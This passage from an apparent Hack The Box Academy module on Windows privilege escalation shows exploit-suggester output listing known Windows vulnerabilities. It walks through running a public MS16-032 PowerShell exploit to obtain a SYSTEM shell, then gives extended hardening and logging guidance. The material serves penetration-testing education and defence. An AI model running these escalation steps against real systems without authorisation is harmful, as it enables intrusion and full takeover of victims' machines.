<span class="hljs-comment">[+]</span> windows version identified as 'Windows 7 SP1 64-bit'
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[E]</span> MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial <span class="hljs-keyword">of</span> Service (MS16-135)
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
<span class="hljs-comment">[*]</span>   https://github.com/tinysec/public/tree/master/CVE-2016-7255
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[E]</span> MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[M]</span> MS16-075: Security Update for Windows SMB Server (3164038) - Important
<span class="hljs-comment">[*]</span>   https://github.com/foxglovesec/RottenPotato
<span class="hljs-comment">[*]</span>   https://github.com/Kevin-Robertson/Tater
<span class="hljs-comment">[*]</span>   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation <span class="hljs-keyword">of</span> Privilege
<span class="hljs-comment">[*]</span>   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[E]</span> MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-<span class="hljs-keyword">of</span>-Bounds Reads/Memory Disclosure (MS16-074), PoC
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[E]</span> MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[E]</span> MS16-059: Security Update for Windows Media Center (3150220) - Important
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[E]</span> MS16-056: Security Update for Windows Journal (3156761) - Critical
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
<span class="hljs-comment">[*]</span>   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[E]</span> MS16-032: Security Update for Secondary Logon to Address Elevation <span class="hljs-keyword">of</span> Privile (3143141) - Important
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
<span class="hljs-comment">[*]</span>   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 &amp; Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
<span class="hljs-comment">[*]</span> 

&lt;SNIP&gt;

<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[M]</span> MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
<span class="hljs-comment">[M]</span> MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation <span class="hljs-keyword">of</span> Privilege (2916607) - Important
<span class="hljs-comment">[E]</span> MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation <span class="hljs-keyword">of</span> Privilege (2880430) - Important
<span class="hljs-comment">[M]</span> MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
<span class="hljs-comment">[M]</span> MS13-090: Cumulative Security Update <span class="hljs-keyword">of</span> ActiveX Kill Bits (2900986) - Critical
<span class="hljs-comment">[M]</span> MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
<span class="hljs-comment">[M]</span> MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
<span class="hljs-comment">[M]</span> MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
<span class="hljs-comment">[M]</span> MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
<span class="hljs-comment">[M]</span> MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
<span class="hljs-comment">[M]</span> MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
<span class="hljs-comment">[M]</span> MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation <span class="hljs-keyword">of</span> Privilege (2778930) - Important
<span class="hljs-comment">[E]</span> MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
<span class="hljs-comment">[*]</span>   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
<span class="hljs-comment">[*]</span>   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
<span class="hljs-comment">[*]</span> 
<span class="hljs-comment">[*]</span> done
</code></pre>
<p>Suppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this <a href="https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/">local exploit suggester module</a> which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.</p>
<p>Looking through the results, we can see a rather extensive list, some Metasploit modules, and some standalone PoC exploits. We must filter through the noise, remove any Denial of Service exploits, and exploits that do not make sense for our target OS. One that stands out immediately as interesting is MS16-032. A detailed explanation of this bug can be found in this <a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">Project Zero blog post</a> which is a bug in the Secondary Logon Service.</p>
<p><strong>Exploiting MS16-032 with PowerShell PoC</strong></p>
<p>Let&#39;s use a <a href="https://www.exploit-db.com/exploits/39719">PowerShell PoC</a> to attempt to exploit this and elevate our privileges.</p>
<p>Windows Desktop Versions</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is <span class="hljs-string">"Y"</span>): A
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is <span class="hljs-string">"Y"</span>): Y


PS C:\htb&gt; Import-Module .\Invoke-MS16-032.ps1
PS C:\htb&gt; Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |<span class="hljs-string">  V  </span>|<span class="hljs-string">  _</span>|<span class="hljs-string">_  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _</span>|<span class="hljs-string">___</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_  </span>|<span class="hljs-string">_  </span>|
        |<span class="hljs-string">     </span>|<span class="hljs-string">_  </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> . </span>|<span class="hljs-string">___</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_  </span>|<span class="hljs-string">  _</span>|
        |<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">___</span>|<span class="hljs-string">_____</span>|<span class="hljs-string">___</span>|<span class="hljs-string">   </span>|<span class="hljs-string">___</span>|<span class="hljs-string">___</span>|<span class="hljs-string">___</span>|

                       [by b33f -&gt; <span class="hljs-meta">@FuzzySec]</span>

[?] Operating system core count: 6
[&gt;] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1656

[<span class="hljs-symbol">*</span>] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[&gt;] Wiping current impersonation token
[&gt;] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1652
[+] Resuming thread..

[<span class="hljs-symbol">*</span>] Sniffing out SYSTEM shell..

[&gt;] Duplicating SYSTEM token
[&gt;] Starting token race
[&gt;] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
</code></pre>
<p><strong>Spawning a SYSTEM Console</strong></p>
<p>This works and we spawn a SYSTEM cmd console.</p>
<p>Windows Desktop Versions</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-string">\htb&gt;</span> whoami

nt authority<span class="hljs-string">\system</span>
</code></pre>
<hr>
<h3 id="attacking-windows-7">Attacking Windows 7</h3>
<p>Taking the enumeration examples we have gone through in this module, access the system below, find one way to escalate to <code>NT AUTHORITY\SYSTEM</code> level access (there may be more than one way), and submit the <code>flag.txt</code> file on the Administrator desktop. After replicating the steps above, challenge yourself to use another method to escalate privileges on the target host.</p>
<h2 id="windows-hardening">Windows Hardening</h2>
<hr>
<p>Proper hardening can eliminate most, if not all, opportunities for local privilege escalation. The following steps should be taken, at a minimum, to reduce the risk of an attacker gaining system-level access.</p>
<hr>
<h3 id="secure-clean-os-installation">Secure Clean OS Installation</h3>
<p>Taking the time to develop a custom image for your environment can save you tons of time in the future from troubleshooting issues with hosts. You can do this utilizing a clean ISO of the OS version you require, a Windows Deployment server or equivalent application for pushing images via disk or networking media, and System Center Configuration Manager (if applicable in your environment). SCCM and WDS are much larger topics than we have room for here, so let&#39;s save them for another time. You can find copies of Windows Operating systems <a href="https://www.microsoft.com/en-us/software-download/">here</a> or pull them using the Microsoft Media Creation Tool. This image should, at a minimum, include:</p>
<ol>
<li>Any applications required for your employees&#39; daily duties.</li>
<li>Configuration changes needed to ensure the functionality and security of the host in your environment.</li>
<li>Current major and minor updates have already been tested for your environment and deemed safe for host deployment.</li>
</ol>
<p>By following this process, you can ensure you clear out any added bloatware or unwanted software preinstalled on the host at the time of purchase. This also makes sure that your hosts in the enterprise all start with the same base configuration, allowing you to troubleshoot, make changes, and push updates much easier.</p>
<hr>
<h3 id="updates-and-patching">Updates and Patching</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works">Microsoft&#39;s Update Orchestrator</a> will run updates for you in the background based on your configured settings. For most, this means it will download and install the most recent updates for you behind the scenes. Keep in mind some updates require a restart to take effect, so it&#39;s a good practice to restart your hosts regularly. For those working in an enterprise environment, you can set up a WSUS server within your environment so that each computer is not reaching out to download them individually. Instead, they can reach out to the configured WSUS server for any updates required.</p>
<p>In a nutshell, the update process looks something like this:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/Windows-Update-Process.png" alt="image"></p>
<ol>
<li>Windows Update Orchestrator will check in with the Microsoft Update servers or your own WSUS server to find new updates needed.<ul>
<li>This will happen at random intervals so that your hosts don&#39;t flood the update server with requests all at once.</li>
<li>The Orchestrator will then check that list against your host configuration to pull the appropriate updates.</li>
</ul>
</li>
<li>Once the Orchestrator decides on applicable updates, it will kick off the downloads in the background.<ul>
<li>The updates are stored in the temp folder for access. The manifests for each download are checked, and only the files needed to apply it are pulled.</li>
</ul>
</li>
<li>Update Orchestrator will then call the installer agent and pass it the necessary action list.</li>
<li>From here, the installer agent applies the updates.<ul>
<li>Note that updates are not yet finalized.</li>
</ul>
</li>
<li>Once updates are done, Orchestrator will finalize them with a reboot of the host.<ul>
<li>This ensures any modification to services or critical settings takes effect.</li>
</ul>
</li>
</ol>
<p>These actions can be managed by <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus">Windows Server Update Services</a>, <code>WSUS</code> or through Group Policy. Regardless of your chosen method to apply updates, ensure you have a plan in place, and updates are being applied regularly to avoid any problems that could arise. Like all things in the IT world, test the rollout of your updates first, in a development setting (on a few hosts), before just pushing an update enterprise-wide. This will ensure you don&#39;t accidentally break some critical app or function with the updates.</p>
<hr>
<h3 id="configuration-management">Configuration Management</h3>
<p>In Windows, configuration management can easily be achieved through the use of Group Policy. Group Policy will allow us to centrally manage user and computer settings and preferences across your environment. This can be achieved by using the Group Policy Management Console (GPMC) or via Powershell.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/gpmc.png" alt="image"></p>
<p>Group policy works best in an Active Directory environment, but you do have the ability to manage local computer and user settings via local group policy. From here, you can manage everything from the individual users&#39; backgrounds, bookmarks, and other browser settings and how and when Windows Defender scans the host and performs updates. This can be a very granular process, so ensure you have a plan for the implementation of any new group policies created or modified.</p>
<hr>
<h3 id="user-management">User Management</h3>
<p>Limiting the number of user and admin accounts on each system and ensuring that login attempts (valid/invalid) are logged and monitored can go a long way for system hardening and monitoring potential problems. It is also good to enforce a strong password policy and two-factor authentication, rotate passwords periodically and restrict users from reusing old passwords by using the <code>Password Policy</code> settings in Group Policy. These settings can be found using GPMC in the path <code>Computer Configuration\Windows Settings\Security Settings\Account Policies\Password Policy</code>. We should also check that users are not placed into groups that give them excessive rights unnecessary for their day-to-day tasks (a regular user having Domain Admin rights, for example) and enforce login restrictions for administrator accounts.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/password-policy.png" alt="image"></p>
<p>This screenshot shows an example of utilizing the group policy editor to view and modify the password policy in the hive mentioned above.</p>
<p>Two Factor Authentication can help prevent fraudulent logins as well. A quick explanation of 2FA is that it requires something you know <code>password or pin</code> and something you have <code>a token, id card, or authenticator application key code</code>. This step will significantly reduce the ability for user accounts to be used maliciously.</p>
<hr>
<h3 id="audit">Audit</h3>
<p>Perform periodic security and configuration checks of all systems. There are several security baselines such as the DISA <a href="https://public.cyber.mil/stigs/">Security Technical Implementation Guides (STIGs)</a> or Microsoft&#39;s <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/security-compliance-toolkit-10">Security Compliance Toolkit</a> that can be followed to set a standard for security in your environment. Many compliance frameworks exist, such as <a href="https://www.iso.org/isoiec-27001-information-security.html">ISO27001</a>, <a href="https://www.pcisecuritystandards.org/pci\_security/">PCI-DSS</a>, and <a href="https://www.hhs.gov/hipaa/for-professionals/security/index.html">HIPAA</a> which can be used by an organization to help establish security baselines. These should all be used as reference guides and not the basis for a security program. A strong security program should have controls tailored to the organization&#39;s needs, operating environment, and the types of data they store and process (i.e., personal health information, financial data, trade secrets, or publicly available information).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/stig-viewer.png" alt="image"></p>
<p>The STIG viewer window we can see above is one way to perform an audit of the security posture of a host. We import a Checklist found at the STIG link above and step through the rules. Each rule ID corresponds with a security check or hardening task to help improve the overall posture of the host. Looking at the right pane, you can see details about the actions required to complete the STIG check.</p>
<p>An audit and configuration review is not a replacement for a penetration test or other types of technical, hands-on assessments and is often seen as a &quot;box-checking&quot; exercise in which an organization is &quot;passed&quot; on a controls audit for performing the bare minimum. These reviews can help supplement regular vulnerability scans, penetration tests, strong patch, vulnerability, and configuration management programs.</p>
<hr>
<h3 id="logging">Logging</h3>
<p>Proper logging and log correlation can make all the difference when troubleshooting an issue or hunting a potential threat in your network. Below we will discuss some apps and logs that can help improve your security posture on a Windows host.</p>
<hr>
<h3 id="sysmon">Sysmon</h3>
<p>Sysmon is a tool built by Microsoft and included in the Sysinternals Suite that enhances the logging and event collection capability in Windows. Sysmon provides detailed info about any processes, network connections, file reads or writes, login attempts and successes, and much much more. These logs can be correlated and shipped out to a SIEM for analysis and provide a better understanding of what we have going on in our environment. Sysmon is persistent on host and will begin writing logs at startup. It&#39;s an extremely helpful tool if appropriately implemented. For more details about Sysmon, check out <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">sysmon info</a>.</p>
<p>Any logs Sysmon writes will be stored in the hive: <code>Applications and Service Logs\Microsoft\Windows\Sysmon\Operational</code>. You can view these by utilizing the event viewer application and drilling into the hive.</p>
<hr>
<h3 id="network-and-host-logs-">Network and Host Logs.</h3>
<p>Tools like <a href="https://www.elastic.co/beats/packetbeat">PacketBeat</a>, IDS\IPS implementations such as Security Onion sensors, and other network monitoring solutions can help complete the picture for your administrators. They collect and ship network traffic logs to your monitoring solutions and SIEMS.</p>
<hr>
<h3 id="key-hardening-measures">Key Hardening Measures</h3>
<p>This is by no means an exhaustive list, but some simple hardening measures are:</p>
<ul>
<li>Secure boot and disk encryption with BitLocker should be enabled and in use.</li>
<li>Audit writable files and directories and any binaries with the ability to launch other apps.</li>
<li>Ensure that any scheduled tasks and scripts running with elevated privileges specify any binaries or executables using the absolute path.</li>
<li>Do not store credentials in cleartext in world-readable files on the host or in shared drives.</li>
<li>Clean up home directories and PowerShell history.</li>
<li>Ensure that low-privileged users cannot modify any custom libraries called by programs.</li>
<li>Remove any unnecessary packages and services that potentially increase the attack surface.</li>
<li>Utilize the Device Guard and Credential Guard features built-in by Microsoft to Windows 10 and most new Server Operating Systems.</li>
<li>Utilize Group Policy to enforce any configuration changes needed to company systems.</li>
</ul>
<p>You may notice, if you take the time to read through a STIG checklist, many of these measures are included in the checks. Be mindful of what your environments use, and determine how these measures will affect the ability to accomplish the mission. Do not blindly implement widespread hardening measures across your network, as what works for one organization may not work for another. Knowing you are trying to protect and then applying the appropriate measures per the requirements of the business is critical.</p>
<hr>
<h3 id="conclusion">Conclusion</h3>
<p>As we have seen, there are many different ways to escalate privileges on Windows systems - from simple misconfigurations and public exploits for known vulnerable services, to exploit development based on custom libraries and executables. Once administrator or SYSTEM level access is obtained, it becomes easier to use it as a pivot point for further network exploitation. System hardening is equally critical for small companies and large enterprises. Watching the attack trends of this day and age, we can see attackers no longer care who the victim is, as long as they can get what they want out of the exchange. Best practice guidelines and controls exist in many different forms. Reviews should include a mix of hands-on manual testing and automated configuration scanning with tools like Nessus, followed by validation of the results. While patching for the latest and greatest attacks and implementing sophisticated monitoring capabilities, do not forget the basics and &quot;low hanging fruit&quot; covered throughout this module.</p>
<p>Finally, ensure your staff is constantly being challenged and trained and staying at the forefront of new vulnerabilities and exploit PoCs so your organization can remain protected as researchers continue to discover new avenues of attack.</p>
